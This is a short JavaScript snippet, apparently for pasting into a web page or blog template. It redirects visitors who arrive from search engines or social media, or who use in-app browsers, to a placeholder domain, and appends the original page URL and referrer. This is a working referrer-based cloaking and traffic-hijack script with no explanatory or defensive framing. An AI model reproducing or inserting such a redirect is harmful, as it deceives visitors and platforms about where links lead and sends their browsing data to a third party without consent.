  //<![CDATA[
var ars = 'http://nama-domain.com';

if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'brave.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
//]]>
